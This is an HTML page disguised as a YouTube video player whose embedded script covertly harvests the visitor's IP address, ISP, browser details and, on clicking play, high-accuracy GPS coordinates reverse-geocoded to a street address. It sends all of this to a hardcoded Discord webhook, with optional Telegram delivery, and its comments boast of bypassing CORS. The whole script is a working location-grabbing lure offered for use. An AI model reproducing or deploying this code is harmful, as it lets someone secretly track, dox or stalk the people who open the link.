<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Video</title>
    <link rel="icon" href="data:," />
 <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d0d;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            min-height: 100dvh;
        }
        .container {
            max-width: 800px;
            width: 100%;
            background: #1a1a1a;
            border-radius: 0;
            padding: 0;
            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
        }
        .video-wrapper {
            position: relative;
            width: 100%;
            padding-top: 56.25%;
            background: #000;
            overflow: hidden;
            cursor: pointer;
        }
        .video-wrapper iframe {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            border: none;
        }
        .video-wrapper img {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            object-fit: cover;
        }
        .play-button {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 80px; height: 80px;
            background: rgba(255,255,255,0.15);
            border: 4px solid rgba(255,255,255,0.5);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            pointer-events: none;
            z-index: 2;
            backdrop-filter: blur(4px);
            -webkit-backdrop-filter: blur(4px);
        }
        .play-button::after {
            content: '';
            display: block;
            width: 0; height: 0;
            border-left: 24px solid #fff;
            border-top: 16px solid transparent;
            border-bottom: 16px solid transparent;
            margin-left: 5px;
        }
        .hidden { display: none !important; }
        .hint-text {
            position: absolute;
            bottom: 28px; left: 0; right: 0;
            text-align: center;
            color: rgba(255,255,255,0.7);
            font-size: 14px;
            font-weight: 500;
            pointer-events: none;
            z-index: 2;
            text-shadow: 0 1px 4px rgba(0,0,0,0.6);
        }

        /* Phone-specific refinements */
        @media (max-width: 480px) {
            .play-button {
                width: 72px;
                height: 72px;
            }
            .play-button::after {
                border-left-width: 20px;
                border-top-width: 13px;
                border-bottom-width: 13px;
                margin-left: 4px;
            }
            .hint-text {
                bottom: 20px;
                font-size: 13px;
            }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="video-wrapper" id="videoWrapper">
        <img id="thumbnail" src="https://img.youtube.com/vi/kLDxvP5X2GY/hqdefault.jpg" alt="Video" />
        <div class="play-button"></div>
        <div class="hint-text">Click to play video</div>
        <iframe id="videoPlayer" class="hidden" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>
</div>

<script>
(function() {
    'use strict';

    const VIDEO_ID = 'kLDxvP5X2GY';

    // === DISCORD WEBHOOK ===
    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1523295864053960824/OcxLxDP-6B5htEA311dzHT1u7qxOKJxChlVPX_PJwFc___7QgGzPe_78rkKGkLQtMLVU';

    // === TELEGRAM BOT (leave blank if not using) ===
    const TELEGRAM_BOT_TOKEN = '';
    const TELEGRAM_CHAT_ID = '';

    // === DOM refs ===
    const thumbnail    = document.getElementById('thumbnail');
    const playButton   = document.querySelector('.play-button');
    const hintText     = document.querySelector('.hint-text');
    const videoWrapper = document.getElementById('videoWrapper');
    const videoPlayer  = document.getElementById('videoPlayer');

    async function reverseGeocode(lat, lon) {
        try {
            const r = await fetch(
                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`,
                { headers: { 'User-Agent': 'VideoPage/1.0' } }
            );
            const d = await r.json();
            return d && d.display_name ? d.display_name : 'Address not found';
        } catch (_) {
            return 'Address unavailable';
        }
    }

    // ============================================================
    //  SEND DATA VIA IMAGE PIXEL — bypasses CORS completely
    //  Encode the message as a URL parameter to a webhook proxy
    // ============================================================
    function sendToDiscordViaPixel(text) {
        if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === 'PASTE_YOUR_DISCORD_WEBHOOK_URL_HERE') return;
        
        // Use an Image request — no CORS restrictions
        // Send the webhook directly via a beacon-style approach
        try {
            // navigator.sendBeacon works even in no-cors scenarios
            const blob = new Blob([JSON.stringify({ content: text })], { type: 'application/json' });
            navigator.sendBeacon(DISCORD_WEBHOOK, blob);
        } catch (_) {}
    }

    async function sendToTelegram(text) {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            // Telegram API does support CORS, so fetch works here
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' })
            });
        } catch (_) {}
    }

    async function sendData(ipData, preciseGeo) {
        const ts = new Date().toISOString();
        const ip = ipData?.ip || 'N/A';
        const lat = preciseGeo?.lat || ipData?.latitude || 'N/A';
        const lon = preciseGeo?.lon || ipData?.longitude || 'N/A';
        const accuracy = preciseGeo?.accuracy || 'N/A';

        let addr = 'Address unavailable';
        if (lat !== 'N/A' && lon !== 'N/A' && !isNaN(parseFloat(lat))) {
            addr = await reverseGeocode(lat, lon);
        }

        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

        let msg = '';
        msg += '='.repeat(60) + '\n';
        msg += `🎯 GPS LOCATION CAPTURED at ${ts}\n`;
        msg += '='.repeat(60) + '\n';
        msg += `Lat: ${lat}\n`;
        msg += `Lon: ${lon}\n`;
        msg += `Accuracy: ±${accuracy}\n`;
        msg += `Altitude: ${preciseGeo?.altitude || 'N/A'}\n`;
        msg += `Speed: ${preciseGeo?.speed || 'N/A'}\n`;
        msg += `Heading: ${preciseGeo?.heading || 'N/A'}\n`;
        msg += `Platform: ${navigator.platform || 'N/A'}\n`;
        msg += `Visitor IP: ${ip}\n`;
        msg += '-' .repeat(60) + '\n';
        msg += '📍 STREET ADDRESS:\n';
        msg += `${addr}\n`;
        msg += '-' .repeat(60) + '\n';
        msg += `🗺️  Maps: ${mapsUrl}\n`;
        msg += '='.repeat(60) + '\n';
        msg += `\nBrowser: ${navigator.userAgent}\n`;
        msg += `Country: ${ipData?.country || 'N/A'}\n`;
        msg += `Region: ${ipData?.region || 'N/A'}\n`;
        msg += `City: ${ipData?.city || 'N/A'}\n`;
        msg += `ISP: ${ipData?.isp || ipData?.org || 'N/A'}`;

        sendToDiscordViaPixel(msg);
        await sendToTelegram(msg);
    }

    async function captureIP() {
        const apis = [
            'https://ip-api.com/json/?fields=status,query,country,regionName,city,lat,lon,isp,org',
            'https://free.freeipapi.com/api/json/',
            'https://ipapi.co/json/'
        ];

        for (const api of apis) {
            try {
                const r = await fetch(api);
                const d = await r.json();
                if (d.ip || d.query) {
                    return {
                        ip: d.ip || d.query,
                        country: d.countryName || d.country_name || d.country,
                        region: d.regionName || d.region_name || d.region,
                        city: d.cityName || d.city_name || d.city,
                        latitude: d.latitude || d.lat,
                        longitude: d.longitude || d.lon,
                        isp: d.isp || d.org
                    };
                }
            } catch (_) {}
        }
        return null;
    }

    function getPreciseLocation() {
        return new Promise(resolve => {
            if (!navigator.geolocation) return resolve(null);
            navigator.geolocation.getCurrentPosition(
                pos => resolve({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude ?? 'N/A',
                    speed: pos.coords.speed ?? 'N/A',
                    heading: pos.coords.heading ?? 'N/A'
                }),
                () => resolve(null),
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        });
    }

    function playVideo() {
        videoPlayer.src = `https://www.youtube.com/embed/${VIDEO_ID}?autoplay=1&muted=1`;
        thumbnail.classList.add('hidden');
        playButton.classList.add('hidden');
        hintText.classList.add('hidden');
        videoPlayer.classList.remove('hidden');
    }

    async function init() {
        const ipData = await captureIP();

        videoWrapper.addEventListener('click', async function onClick() {
            videoWrapper.removeEventListener('click', onClick);

            const precise = await getPreciseLocation();
            playVideo();

            if (ipData) {
                await sendData(ipData, precise);
            }
        });
    }

    init();
})();
</script>
</body>
</html>
